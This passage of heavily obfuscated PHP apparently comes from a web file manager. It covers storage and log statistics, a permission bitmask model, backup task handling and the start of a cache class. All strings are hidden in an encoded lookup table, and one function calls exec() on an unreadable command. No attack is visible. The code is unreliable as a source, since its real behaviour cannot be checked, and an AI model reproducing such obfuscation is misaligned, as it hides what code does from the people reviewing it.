$­»ôœ” = strtotime(date($šÚÒºöœ[1936])); if ($Œ¥µŒø < $­»ôœ”) { $Œ¥µŒø = $­»ôœ”; } $íÄŞ’‚å = array($šÚÒºöœ[1956] => array($šÚÒºöœ[1110], $Œ¥µŒø)); $Õİ’şş = (int) Model($šÚÒºöœ[601])->where($íÄŞ’‚å)->count($šÚÒºöœ[1795]); if (!$Õİ’şş) { $Õİ’şş = 1; } $íÄŞ’‚å = array($šÚÒºöœ[1956] => array($šÚÒºöœ[1110], $­»ôœ”)); $Óüº£òÅ = Model($šÚÒºöœ[601])->where($íÄŞ’‚å)->count($šÚÒºöœ[1795]); return array($šÚÒºöœ[843] => (int) $Œ³·‡öÊ, $šÚÒºöœ[1957] => (int) ($Œ³·‡öÊ - $—«¶‘‚Š), $šÚÒºöœ[1958] => (int) $—«¶‘‚Š, $šÚÒºöœ[1959] => (int) $Óüº£òÅ, $šÚÒºöœ[1960] => $Õİ’şş); } private function optionFile() { $×‚ÆÅÆå =& $_SERVER[™¸œØ®Ü]; $éœ¯åê = $this->sourceSize(); $ÜÎàÆß© = $éœ¯åê[$×‚ÆÅÆå[79]]; $ÅÓíÏàÀ = $éœ¯åê[$×‚ÆÅÆå[1929]]; $·äÑ‚ßç = Model($×‚ÆÅÆå[915])->where(array($×‚ÆÅÆå[487] => 0))->count($×‚ÆÅÆå[193]); $¯ä’ôÒ = array($×‚ÆÅÆå[487] => 0, $×‚ÆÅÆå[233] => array($×‚ÆÅÆå[1110], strtotime(date($×‚ÆÅÆå[1936])))); $³ÍÎÚí = Model($×‚ÆÅÆå[915])->where($¯ä’ôÒ)->sum($×‚ÆÅÆå[79]); $Ä†ğüõæ = Model($×‚ÆÅÆå[915])->where($¯ä’ôÒ)->count($×‚ÆÅÆå[193]); return array($×‚ÆÅÆå[848] => $ÜÎàÆß©, $×‚ÆÅÆå[1929] => $ÅÓíÏàÀ, $×‚ÆÅÆå[1961] => $ÜÎàÆß© - $ÅÓíÏàÀ, $×‚ÆÅÆå[1962] => (int) $³ÍÎÚí, $×‚ÆÅÆå[850] => (int) $·äÑ‚ßç, $×‚ÆÅÆå[1963] => (int) $Ä†ğüõæ); } private function optionAccess() { $üƒºĞ¼½ =& $_SERVER[™¸œØ®Ü]; return array($üƒºĞ¼½[843] => $this->typeLogCnt(), $üƒºĞ¼½[110] => $this->typeLogCnt($üƒºĞ¼½[110]), $üƒºĞ¼½[527] => $this->typeLogCnt($üƒºĞ¼½[527]), $üƒºĞ¼½[1964] => $this->typeLogCnt($üƒºĞ¼½[1964]), $üƒºĞ¼½[1965] => $this->typeLogCnt($üƒºĞ¼½[1965]), $üƒºĞ¼½[669] => $this->typeLogCnt($üƒºĞ¼½[12], $üƒºĞ¼½[1940])); } private function typeLogCnt($³Æï¾Ø‡ = '', $ºÁÏŸáó = "\x69\144") { $ÛëÎ»è® =& $_SERVER[™¸œØ®Ü]; $¼…ÛÄş = array($ÛëÎ»è®[110] => array($ÛëÎ»è®[1966], $ÛëÎ»è®[1967]), $ÛëÎ»è®[527] => array($ÛëÎ»è®[1968], $ÛëÎ»è®[1969]), $ÛëÎ»è®[1964] => array($ÛëÎ»è®[1970], $ÛëÎ»è®[1971], $ÛëÎ»è®[1972]), $ÛëÎ»è®[1965] => array($ÛëÎ»è®[1973], $ÛëÎ»è®[1974]), $ÛëÎ»è®[1975] => array($ÛëÎ»è®[1976], $ÛëÎ»è®[1977], $ÛëÎ»è®[1978])); $–Óˆ´ÆÖ = strtotime(date($ÛëÎ»è®[1936])); $ĞßàØ„­ = array($ÛëÎ»è®[233] => array($ÛëÎ»è®[1110], $–Óˆ´ÆÖ)); if ($³Æï¾Ø‡) { $ĞßàØ„­[$ÛëÎ»è®[33]] = array($ÛëÎ»è®[7], $¼…ÛÄş[$³Æï¾Ø‡]); } $ŸÔÕ¡‡É = Model($ÛëÎ»è®[1939])->where($ĞßàØ„­)->count($ºÁÏŸáó); return (int) $ŸÔÕ¡‡É; } private function optionServer() { $ÛƒƒèêÁ =& $_SERVER[™¸œØ®Ü]; $£¢Ø’ó” = $this->diskDriver(); $ÎÇıİ«å = KodIO::defaultDriver(); $¨–€¯«’ = array($ÛƒƒèêÁ[908] => $ÎÇıİ«å[$ÛƒƒèêÁ[477]]); $©û«û÷© = Model($ÛƒƒèêÁ[548])->where($¨–€¯«’)->sum($ÛƒƒèêÁ[79]); $ßóæµäï = explode($ÛƒƒèêÁ[53], $_SERVER[$ÛƒƒèêÁ[147]]); $Öù‹æ¶Ç = $ßóæµäï[0]; $³ÕŸ˜§é = $GLOBALS[$ÛƒƒèêÁ[6]][$ÛƒƒèêÁ[21]]; $¤èı‚«ê = $³ÕŸ˜§é[$ÛƒƒèêÁ[1072]]; if ($¤èı‚«ê == $ÛƒƒèêÁ[1060]) { $Òå¡ˆÛ‘ = explode($ÛƒƒèêÁ[1387], $³ÕŸ˜§é[$ÛƒƒèêÁ[1071]]); $¤èı‚«ê = $Òå¡ˆÛ‘[0]; } if ($¤èı‚«ê == $ÛƒƒèêÁ[1008] || $¤èı‚«ê == $ÛƒƒèêÁ[893]) { $İ«¸ÄØ = Model()->db()->query($ÛƒƒèêÁ[1979]); $Ãà¶À‚å = $İ«¸ÄØ[0] && isset($İ«¸ÄØ[0][$ÛƒƒèêÁ[1682]]) ? $İ«¸ÄØ[0][$ÛƒƒèêÁ[1682]] : 0; $¤èı‚«ê = $ÛƒƒèêÁ[1980] . ($Ãà¶À‚å ? $ÛƒƒèêÁ[8] . $Ãà¶À‚å : $ÛƒƒèêÁ[12]); } $Æß±Í®µ = $GLOBALS[$ÛƒƒèêÁ[6]][$ÛƒƒèêÁ[426]][$ÛƒƒèêÁ[917]]; return array($ÛƒƒèêÁ[1981] => $£¢Ø’ó” ? $£¢Ø’ó”[$ÛƒƒèêÁ[1982]] : 0, $ÛƒƒèêÁ[1983] => $£¢Ø’ó” ? $£¢Ø’ó”[$ÛƒƒèêÁ[1984]] : 0, $ÛƒƒèêÁ[1985] => (int) $ÎÇıİ«å[$ÛƒƒèêÁ[1982]] * 1024 * 1024 * 1024, $ÛƒƒèêÁ[1986] => (int) $©û«û÷©, $ÛƒƒèêÁ[1987] => ucfirst($Öù‹æ¶Ç), $ÛƒƒèêÁ[1988] => $ÛƒƒèêÁ[1989] . PHP_VERSION, $ÛƒƒèêÁ[1990] => phpBuild64() ? 64 : 32, $ÛƒƒèêÁ[842] => str_replace($ÛƒƒèêÁ[1228], $ÛƒƒèêÁ[1088], $¤èı‚«ê), $ÛƒƒèêÁ[426] => ucfirst($Æß±Í®µ), $ÛƒƒèêÁ[32] => $_SERVER[$ÛƒƒèêÁ[1991]]); } private function diskDriver() { $Î‰í½Âç =& $_SERVER[™¸œØ®Ü]; $äÈƒÙÌ¥ = $Î‰í½Âç[8]; $âºŸÅ = $GLOBALS[$Î‰í½Âç[6]][$Î‰í½Âç[1404]] == $Î‰í½Âç[1405]; if ($âºŸÅ) { $äÈƒÙÌ¥ = $Î‰í½Âç[1992]; if (function_exists($Î‰í½Âç[1993])) { exec($Î‰í½Âç[1994], $œèˆö); $äÈƒÙÌ¥ = $œèˆö[1] . $Î‰í½Âç[8]; } } if (!file_exists($äÈƒÙÌ¥)) { return; } if (!function_exists($Î‰í½Âç[1995])) { return; } $¸â­û­ = @disk_total_space($äÈƒÙÌ¥); $ä™©†³ = $¸â­û­ - @disk_free_space($äÈƒÙÌ¥); return array($Î‰í½Âç[1982] => $¸â­û­, $Î‰í½Âç[1984] => $ä™©†³); } public function fileChart($×Ş©±„é) { $¥”‹×»Ò =& $_SERVER[™¸œØ®Ü]; if (isset($×Ş©±„é[$¥”‹×»Ò[1795]])) { return Model($¥”‹×»Ò[915])->userFileTypeProfile($×Ş©±„é[$¥”‹×»Ò[1795]]); } if (isset($×Ş©±„é[$¥”‹×»Ò[1996]])) { return Model($¥”‹×»Ò[915])->groupFileTypeProfile($×Ş©±„é[$¥”‹×»Ò[1996]]); } $ÌÕË®‘± = $this->sourceSize(); $öó«—ÑÑ = array($¥”‹×»Ò[192] => 0, $¥”‹×»Ò[190] => 1); $´ß½Â¦œ = Model($¥”‹×»Ò[915])->where($öó«—ÑÑ)->sum($¥”‹×»Ò[79]); $öó«—ÑÑ[$¥”‹×»Ò[190]] = 2; $¹¶×¦Õ = Model($¥”‹×»Ò[915])->where($öó«—ÑÑ)->sum($¥”‹×»Ò[79]); return array($¥”‹×»Ò[848] => $ÌÕË®‘±[$¥”‹×»Ò[79]], $¥”‹×»Ò[1929] => $ÌÕË®‘±[$¥”‹×»Ò[1929]], $¥”‹×»Ò[1930] => (int) $´ß½Â¦œ, $¥”‹×»Ò[1931] => (int) $¹¶×¦Õ); } private function sourceSize() { $§ë±ïºÉ =& $_SERVER[™¸œØ®Ü]; $Ùßƒ’± = Model($§ë±ïºÉ[915])->where(array($§ë±ïºÉ[487] => 0))->sum($§ë±ïºÉ[79]); $óÃÊëØ = Model($§ë±ïºÉ[548])->sum($§ë±ïºÉ[79]); if ($óÃÊëØ > $Ùßƒ’±) { $óÃÊëØ = $Ùßƒ’±; } return array($§ë±ïºÉ[79] => (int) $Ùßƒ’±, $§ë±ïºÉ[1929] => (int) $óÃÊëØ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ïşØ£É¢ =& $_SERVER[™¸œØ®Ü]; $ÎÂËÒ›Î = array(array($ïşØ£É¢[496] => LNG($ïşØ£É¢[1997]), $ïşØ£É¢[1998] => $ïşØ£É¢[1999], $ïşØ£É¢[2000] => 1, $ïşØ£É¢[2001] => 1, $ïşØ£É¢[2002] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ïşØ£É¢[496] => LNG($ïşØ£É¢[2003]), $ïşØ£É¢[1998] => $ïşØ£É¢[2004], $ïşØ£É¢[2000] => 2, $ïşØ£É¢[2001] => 1, $ïşØ£É¢[2002] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ïşØ£É¢[496] => LNG($ïşØ£É¢[2005]), $ïşØ£É¢[1998] => $ïşØ£É¢[2006], $ïşØ£É¢[2000] => 3, $ïşØ£É¢[2001] => 1, $ïşØ£É¢[2002] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ïşØ£É¢[496] => LNG($ïşØ£É¢[2007]), $ïşØ£É¢[1998] => $ïşØ£É¢[2008], $ïşØ£É¢[2000] => 4, $ïşØ£É¢[2001] => 1, $ïşØ£É¢[2002] => self::AUTH_SHOW | self::AUTH_VIEW), array($ïşØ£É¢[496] => LNG($ïşØ£É¢[2009]), $ïşØ£É¢[1998] => $ïşØ£É¢[2010], $ïşØ£É¢[2000] => 5, $ïşØ£É¢[2001] => 1, $ïşØ£É¢[2002] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ïşØ£É¢[496] => LNG($ïşØ£É¢[2011]), $ïşØ£É¢[1998] => $ïşØ£É¢[2012], $ïşØ£É¢[2000] => 6, $ïşØ£É¢[2001] => 1, $ïşØ£É¢[2002] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ïşØ£É¢[496] => LNG($ïşØ£É¢[2013]), $ïşØ£É¢[1998] => $ïşØ£É¢[2014], $ïşØ£É¢[2000] => 7, $ïşØ£É¢[2001] => 1, $ïşØ£É¢[2002] => 0)); return $ÎÂËÒ›Î; } public static function authCheck($ì½Ã­Ä‰, $İõ¬ËºÜ) { $ö‡³øØç =& $_SERVER[™¸œØ®Ü]; $ì½Ã­Ä‰ = intval($ì½Ã­Ä‰); if (KodUser::isRoot() && $GLOBALS[$ö‡³øØç[6]][$ö‡³øØç[2015]]) { return !0; } if ($ì½Ã­Ä‰ <= 0) { return !1; } if (($ì½Ã­Ä‰ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ì½Ã­Ä‰ & $İõ¬ËºÜ); } public static function authCheckShow($Î´É©¢æ) { return self::authCheck($Î´É©¢æ, self::AUTH_SHOW); } public static function authCheckView($öêşØû¶) { return self::authCheck($öêşØû¶, self::AUTH_VIEW); } public static function authCheckDownload($œ¡èÃš) { return self::authCheck($œ¡èÃš, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ÉäˆÊ¦å) { return self::authCheck($ÉäˆÊ¦å, self::AUTH_UPLOAD); } public static function authCheckEdit($ŞóºŠ°É) { return self::authCheck($ŞóºŠ°É, self::AUTH_EDIT); } public static function authCheckRemove($æå¬Š‡) { return self::authCheck($æå¬Š‡, self::AUTH_REMOVE); } public static function authCheckShare($Ü’µ¦„°) { return self::authCheck($Ü’µ¦„°, self::AUTH_SHARE); } public static function authCheckComment($à¾õééİ) { return self::authCheck($à¾õééİ, self::AUTH_COMMENT); } public static function authCheckEvent($ØÎÈäí‰) { return self::authCheck($ØÎÈäí‰, self::AUTH_EVENT); } public static function authCheckRoot($ïÛí‰) { return self::authCheck($ïÛí‰, self::AUTH_ROOT); } public static function authCheckAction($ğôÕ€Úã, $¥ò«â) { $âÓ Ğ†á =& $_SERVER[™¸œØ®Ü]; $Šä÷›–¢ = array($âÓ Ğ†á[2016] => self::AUTH_VIEW, $âÓ Ğ†á[1298] => self::AUTH_DOWNLOAD, $âÓ Ğ†á[110] => self::AUTH_UPLOAD, $âÓ Ğ†á[1965] => self::AUTH_EDIT, $âÓ Ğ†á[1964] => self::AUTH_REMOVE, $âÓ Ğ†á[1975] => self::AUTH_SHARE, $âÓ Ğ†á[431] => self::AUTH_COMMENT, $âÓ Ğ†á[1782] => self::AUTH_EVENT, $âÓ Ğ†á[2017] => self::AUTH_ROOT); if (!isset($Šä÷›–¢[$¥ò«â])) { return; } $œêŒß = $Šä÷›–¢[$¥ò«â]; $ğôÕ€Úã = intval($ğôÕ€Úã); if ($ğôÕ€Úã <= 0) { return !1; } if (($ğôÕ€Úã & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ğôÕ€Úã & $œêŒß); } public static function authDisable($èŞæ¶‘ß, $ Çö±‘¤) { if (intval($èŞæ¶‘ß) <= 0) { return 0; } return intval($èŞæ¶‘ß) & ~$ Çö±‘¤; } public $optionType = "\x53\x79\163\164\145\x6d\56\x73\157\165\162\x63\145\101\165\x74\x68\x4c\x69\163\164"; public $field = array("\156\x61\x6d\x65", "\141\165\x74\150", "\x6c\141\x62\x65\154", "\144\151\x73\x70\x6c\x61\171", "\163\171\163\164\145\x6d", "\x73\157\162\164"); public function initData() { $ğ£äœà¨ = $this->authDefault(); foreach ($ğ£äœà¨ as $‚Õµü¸Å) { $this->add($‚Õµü¸Å); } } public function findAuth($º’ó¿š, $“ò„ı›ï) { $¿¥¸§¯ô =& $_SERVER[™¸œØ®Ü]; $İŞ™ÁŞ¯ = parent::listData(); foreach ($İŞ™ÁŞ¯ as $ıÖåØ‘—) { $˜Ë¤ò”Ÿ = intval($ıÖåØ‘—[$¿¥¸§¯ô[489]]); if ($˜Ë¤ò”Ÿ <= 0 || $ıÖåØ‘—[$¿¥¸§¯ô[2018]] == 0) { continue; } if (($˜Ë¤ò”Ÿ & $º’ó¿š) != $º’ó¿š) { continue; } if (($˜Ë¤ò”Ÿ & $“ò„ı›ï) != 0) { continue; } return $ıÖåØ‘—[$¿¥¸§¯ô[477]]; } return !1; } public function findAuthMax($ïî‚±¨, $êœ­àË) { $İ­ÙŠÓ‘ =& $_SERVER[™¸œØ®Ü]; $Ç¡ÓÇÑ = !1; $¯Íœ”¶½ = parent::listData(); foreach ($¯Íœ”¶½ as $õ¬™´ñÔ) { $Òå©©öá = intval($õ¬™´ñÔ[$İ­ÙŠÓ‘[489]]); if ($Òå©©öá <= 0 || $õ¬™´ñÔ[$İ­ÙŠÓ‘[2018]] == 0) { continue; } if (($Òå©©öá & $ïî‚±¨) != $ïî‚±¨) { continue; } if (($Òå©©öá & $êœ­àË) != 0) { continue; } if (!$Ç¡ÓÇÑ) { $Ç¡ÓÇÑ = $õ¬™´ñÔ; continue; } if (intval($Ç¡ÓÇÑ[$İ­ÙŠÓ‘[489]]) < $Òå©©öá) { $Ç¡ÓÇÑ = $õ¬™´ñÔ; } } return $Ç¡ÓÇÑ ? $Ç¡ÓÇÑ[$İ­ÙŠÓ‘[477]] : !1; } public function findAuthReadOnly() { $…­ªîÚã = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $¦Ì°¨è = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($…­ªîÚã, $¦Ì°¨è); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $š¹œ¿”Ó =& $_SERVER[™¸œØ®Ü]; $¬¥Õø¨ = parent::listData(); $îô„³ç÷ = !1; foreach ($¬¥Õø¨ as $êœòÛ…²) { if ($êœòÛ…²[$š¹œ¿”Ó[489]] <= 0 || $êœòÛ…²[$š¹œ¿”Ó[2018]] == $š¹œ¿”Ó[230]) { continue; } if (!$îô„³ç÷) { $îô„³ç÷ = $êœòÛ…²; continue; } if ($îô„³ç÷[$š¹œ¿”Ó[489]] > $êœòÛ…²[$š¹œ¿”Ó[489]]) { $îô„³ç÷ = $êœòÛ…²; } } return $îô„³ç÷ ? $îô„³ç÷[$š¹œ¿”Ó[477]] : $š¹œ¿”Ó[12]; } public function listData($‡„°üúñ = false, $É¢ƒ¯ = "\163\x6f\x72\164", $”°¼Úßõ = false) { return parent::listData($‡„°üúñ, $É¢ƒ¯, $”°¼Úßõ); } public function update($®ê ƒÈ, $Ü×ÏŞÃ) { $‡ÛĞî› =& $_SERVER[™¸œØ®Ü]; $Ší ïêÁ = parent::listData($®ê ƒÈ); $íâ•Üç = $this->findByName($Ü×ÏŞÃ[$‡ÛĞî›[32]]); if (!$Ší ïêÁ || $íâ•Üç && $íâ•Üç[$‡ÛĞî›[477]] != $Ší ïêÁ[$‡ÛĞî›[477]]) { return !1; } $this->filterAuth($Ü×ÏŞÃ[$‡ÛĞî›[489]]); return parent::update($®ê ƒÈ, $Ü×ÏŞÃ); } public function remove($á­ç´ÍÙ) { $ğ®èš¿¤ = parent::listData($á­ç´ÍÙ); if (!$ğ®èš¿¤ || $ğ®èš¿¤[$_SERVER[™¸œØ®Ü][191]]) { return !1; } return parent::remove($á­ç´ÍÙ); } public function add($½ÒÎé½ = array()) { $Ô‰²ÒÑË =& $_SERVER[™¸œØ®Ü]; if ($this->findByName($½ÒÎé½[$Ô‰²ÒÑË[32]])) { return !1; } $’¼¼…Ë­ = array($Ô‰²ÒÑË[32] => $Ô‰²ÒÑË[12], $Ô‰²ÒÑË[489] => 1, $Ô‰²ÒÑË[2019] => $Ô‰²ÒÑË[2006], $Ô‰²ÒÑË[2018] => 1, $Ô‰²ÒÑË[191] => 0, $Ô‰²ÒÑË[2020] => 0); $½ÒÎé½ = array_merge($’¼¼…Ë­, $½ÒÎé½); $½ÒÎé½[$Ô‰²ÒÑË[2020]] = $this->getSort(); $this->filterAuth($½ÒÎé½[$Ô‰²ÒÑË[489]]); return parent::insert($½ÒÎé½); } private function getSort() { $æ¾ŞğªÎ =& $_SERVER[™¸œØ®Ü]; $Ùå€¦ = parent::listData(); $ŸËµ²³ô = array_to_keyvalue($Ùå€¦, $æ¾ŞğªÎ[12], $æ¾ŞğªÎ[2020]); return empty($ŸËµ²³ô) ? 0 : max($ŸËµ²³ô) + 1; } private function filterAuth(&$ÊÖ¬›É) { if (!$ÊÖ¬›É) { return; } $®¾™›Ùã = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $¾õó½ = array(); foreach ($®¾™›Ùã as $”šÈÛéæ) { if ($ÊÖ¬›É & $”šÈÛéæ) { $¾õó½[] = $”šÈÛéæ; } } if (in_array(self::AUTH_ROOT, $¾õó½)) { $ÊÖ¬›É = array_sum($®¾™›Ùã); return; } $ÀûøËÉå = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($¾õó½ as $”šÈÛéæ) { if (isset($ÀûøËÉå[$”šÈÛéæ])) { $¾õó½ = array_merge($¾õó½, $ÀûøËÉå[$”šÈÛéæ]); } } $¾õó½[] = self::AUTH_SHOW; $ÊÖ¬›É = array_sum(array_unique($¾õó½)); } public function sort($¼âØş“Ä, $§¾‘Š‘ô) { return parent::update($¼âØş“Ä, $§¾‘Š‘ô); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\x2e\142\x61\x63\153\x75\160\x4c\x69\163\164"; public $field = array("\x69\157", "\x6e\x61\x6d\x65", "\x73\x74\141\x74\x75\163", "\143\157\156\x74\145\156\x74", "\155\141\x6e\165\x61\154", "\162\145\163\x75\154\x74", "\x74\151\155\x65\106\162\157\x6d", "\x74\x69\x6d\x65\x54\x6f"); public function config() { $‡ˆ©ÚÄ =& $_SERVER[™¸œØ®Ü]; Action($‡ˆ©ÚÄ[2021])->taskInit(); $¤Û‹ÛÙŞ = Model($‡ˆ©ÚÄ[855])->get($‡ˆ©ÚÄ[862]); $¤Û‹ÛÙŞ = json_decode($¤Û‹ÛÙŞ, !0); $¤Û‹ÛÙŞ = is_array($¤Û‹ÛÙŞ) ? $¤Û‹ÛÙŞ : array(); $this->parseContent($¤Û‹ÛÙŞ); unset($¤Û‹ÛÙŞ[$‡ˆ©ÚÄ[1764]]); Model($‡ˆ©ÚÄ[1763])->cacheClear(); $½²®›¢¦ = $‡ˆ©ÚÄ[2022]; $·¨®ï©³ = Model($‡ˆ©ÚÄ[2023])->findByKey($‡ˆ©ÚÄ[1782], $½²®›¢¦); if (!$·¨®ï©³) { $·¨®ï©³ = array(); } if (isset($·¨®ï©³[$‡ˆ©ÚÄ[206]])) { $·¨®ï©³[$‡ˆ©ÚÄ[206]] = json_decode($·¨®ï©³[$‡ˆ©ÚÄ[206]], !0); } if (isset($¤Û‹ÛÙŞ[$‡ˆ©ÚÄ[206]])) { $·¨®ï©³[$‡ˆ©ÚÄ[206]][$‡ˆ©ÚÄ[1767]] = $¤Û‹ÛÙŞ[$‡ˆ©ÚÄ[206]]; unset($¤Û‹ÛÙŞ[$‡ˆ©ÚÄ[206]]); } return array_merge($·¨®ï©³, $¤Û‹ÛÙŞ); } public function listData($Íø®İşî = false, $·ÎÙÛ†“ = "\x6d\157\144\151\x66\x79\x54\x69\x6d\145", $Î·˜Á»® = false) { $´éÛáµŸ = parent::listData($Íø®İşî, $·ÎÙÛ†“, !0); if (!$´éÛáµŸ) { return $´éÛáµŸ; } if ($Íø®İşî) { $´éÛáµŸ = array($´éÛáµŸ); } foreach ($´éÛáµŸ as &$™¬ĞÑ¨Ğ) { $this->parseContent($™¬ĞÑ¨Ğ); } return $Íø®İşî ? $´éÛáµŸ[0] : $´éÛáµŸ; } public function parseContent(&$ˆÅƒÙäÛ) { $®»ªéÎ =& $_SERVER[™¸œØ®Ü]; $›¶ø”üğ = _get($ˆÅƒÙäÛ, $®»ªéÎ[171], $®»ªéÎ[91]); if (!in_array($›¶ø”üğ, array($®»ªéÎ[861], $®»ªéÎ[1228]))) { $ˆÅƒÙäÛ[$®»ªéÎ[171]] = $›¶ø”üğ == $®»ªéÎ[91] ? $®»ªéÎ[1228] : $®»ªéÎ[861]; } } public function lastItem() { $üìíÖ = $this->listData(); return !empty($üìíÖ[0]) ? $üìíÖ[0] : null; } public function kill($½¸¤²¤¾) { $›ü½âæÀ =& $_SERVER[™¸œØ®Ü]; $Ö‘±ø§½ = $this->listData($½¸¤²¤¾); if (!$Ö‘±ø§½ || empty($Ö‘±ø§½[$›ü½âæÀ[32]])) { return !0; } Task::kill($›ü½âæÀ[870]); Task::kill($›ü½âæÀ[889]); Task::kill($›ü½âæÀ[899]); $·‘•­¼× = $Ö‘±ø§½[$›ü½âæÀ[32]]; $ÓÃ“åı = TEMP_FILES . $›ü½âæÀ[865] . $·‘•­¼× . $›ü½âæÀ[8]; IO::remove($ÓÃ“åı, !1); return $this->remove($½¸¤²¤¾); } public function remove($íßÒŠÄ) { $Æõ¢½è¯ = $this->listData($íßÒŠÄ); if (!$Æõ¢½è¯) { return !0; } return $this->backupRemove($Æõ¢½è¯); } private function backupRemove($•¹¡şıÀ) { parent::remove($•¹¡şıÀ[$_SERVER[™¸œØ®Ü][477]]); $Äº²Ô’š = $this->backupPath($•¹¡şıÀ); IO::remove($Äº²Ô’š, !1); return !0; } private function backupPath($©–‰‹êƒ) { $±˜ñÛÌÖ =& $_SERVER[™¸œØ®Ü]; $°£´Ú‹× = $©–‰‹êƒ[$±˜ñÛÌÖ[32]]; $…»º¶‰Ï = Model($±˜ñÛÌÖ[855])->get($±˜ñÛÌÖ[856]); $ÊÃìÅ× = substr(md5($±˜ñÛÌÖ[857] . $…»º¶‰Ï . $°£´Ú‹×), 0, 8); return "\x7b\x69\157\x3a{$©–‰‹êƒ[$±˜ñÛÌÖ[837]]}\175\57\x64\141\x74\141\x62\x61\x73\145\x2f\142\141\143\x6b\165\x70\57" . $°£´Ú‹× . $±˜ñÛÌÖ[11] . $ÊÃìÅ×; } public function start() { $ÚôàºÇİ =& $_SERVER[™¸œØ®Ü]; if ($GLOBALS[$ÚôàºÇİ[6]][$ÚôàºÇİ[92]][$ÚôàºÇİ[2024]] != $ÚôàºÇİ[91]) { return !0; } $‡¯¬±ğÃ = $this->config(); if (!$‡¯¬±ğÃ || $‡¯¬±ğÃ[$ÚôàºÇİ[1764]] != $ÚôàºÇİ[91]) { return !1; } if ($‡¯¬±ğÃ[$ÚôàºÇİ[171]] == $ÚôàºÇİ[861]) { $Í¢”À² = Model($ÚôàºÇİ[855])->get($ÚôàºÇİ[1343]); if ($Í¢”À² == $ÚôàºÇİ[1344]) { $‡¯¬±ğÃ[$ÚôàºÇİ[171]] = $ÚôàºÇİ[1228]; } } $ş®ûé = $this->process(); foreach ($ş®ûé as $€¨“ˆ¢Ş) { if ($€¨“ˆ¢Ş) { return Task::restart($€¨“ˆ¢Ş[$ÚôàºÇİ[477]]); } } $µºÊ—¬Ü = new Backup(); $ÁÜ©ú¸ø = $µºÊ—¬Ü->db(); if ($ÁÜ©ú¸ø) { $ÁÜ©ú¸ø = $µºÊ—¬Ü->dbFile(); if ($ÁÜ©ú¸ø && $‡¯¬±ğÃ[$ÚôàºÇİ[171]] == $ÚôàºÇİ[861]) { $ÁÜ©ú¸ø = $µºÊ—¬Ü->file(); } } Backup::set(array($ÚôàºÇİ[835] => 1, $ÚôàºÇİ[846] => time())); return !0; } public function process() { $š°­ãçĞ =& $_SERVER[™¸œØ®Ü]; $¾Ø¿¬Ğ = array($š°­ãçĞ[842] => Task::get($š°­ãçĞ[870]), $š°­ãçĞ[847] => Task::get($š°­ãçĞ[889]), $š°­ãçĞ[232] => Task::get($š°­ãçĞ[899])); $–ˆäƒ¨ù = !1; foreach ($¾Ø¿¬Ğ as &$¦îÅÔÎ) { if ($–ˆäƒ¨ù) { $¦îÅÔÎ = !1; continue; } if ($¦îÅÔÎ) { $ƒô¥÷˜– = intval(_get($¦îÅÔÎ, $š°­ãçĞ[1800], 0)); if (time() - $ƒô¥÷˜– > 7200) { Task::kill($¦îÅÔÎ[$š°­ãçĞ[477]]); $–ˆäƒ¨ù = !0; $¦îÅÔÎ = !1; } } } return $¾Ø¿¬Ğ; } public function restore() { $Î±Ø›¼¼ =& $_SERVER[™¸œØ®Ü]; ActionCall($Î±Ø›¼¼[1156], !0, 1); ActionCall($Î±Ø›¼¼[1156], !0, 0); } } goto c÷â­ÀÕÁ; B¢Š°§¼Íˆ: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ĞÜ´·ˆñ =& $_SERVER[™¸œØ®Ü]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $²¥ ğÜ± = $GLOBALS[$ĞÜ´·ˆñ[6]][$ĞÜ´·ˆñ[426]]; $Õé‡‹üç = $²¥ ğÜ±[$²¥ ğÜ±[$ĞÜ´·ˆñ[917]]]; $û¨®†§¤ = $²¥ ğÜ±[$ĞÜ´·ˆñ[918]]; switch ($²¥ ğÜ±[$ĞÜ´·ˆñ[917]]) { case $ĞÜ´·ˆñ[21]: self::$handle = Model($ĞÜ´·ˆñ[919]); break; case $ĞÜ´·ˆñ[920]: self::$handle = new CacheRedis($Õé‡‹üç, $û¨®†§¤); break; case 